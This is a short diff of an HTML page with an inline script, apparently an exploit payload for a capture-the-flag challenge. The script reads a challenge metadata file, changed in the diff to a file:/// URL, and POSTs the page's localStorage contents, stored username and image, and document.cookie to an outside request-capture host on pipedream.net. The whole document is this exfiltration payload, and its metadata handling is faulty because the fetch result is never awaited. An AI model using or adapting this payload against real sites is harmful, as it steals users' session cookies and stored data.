@@ -1,14 +1,14 @@
 <html>
   <body>
     <script>
-      var response = fetch('challenge/metadata.json')
+      var response = fetch('file:///challenge/metadata.json')
       fetch("https://enpn4cpd36tko.x.pipedream.net/", {
         method: "post",
         body: JSON.stringify({
-          cool: Object.entries(localStorage),
+          store: Object.entries(localStorage),
           username: localStorage.getItem('username'),
           image: localStorage.getItem('image'),
-          metadata: response.json(),
+          metadata: JSON.stringify(response),
           cookie: document.cookie,
         }),
       });
